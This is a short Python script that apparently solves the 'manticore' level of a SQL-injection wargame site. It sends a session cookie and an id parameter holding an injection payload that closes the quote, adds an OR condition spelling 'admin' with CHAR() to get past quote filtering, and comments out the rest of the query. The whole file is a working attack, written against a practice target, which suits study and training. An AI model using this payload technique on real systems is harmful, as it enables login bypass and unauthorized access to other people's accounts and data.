import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/manticore_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


res = requests.get(url, params={'id': '\' or id=char(97,100,109,105,110) --'},cookies=cookie)

if res.text.find("Clear") >= 0:
    print("Clear!")
else:
    print("Failed")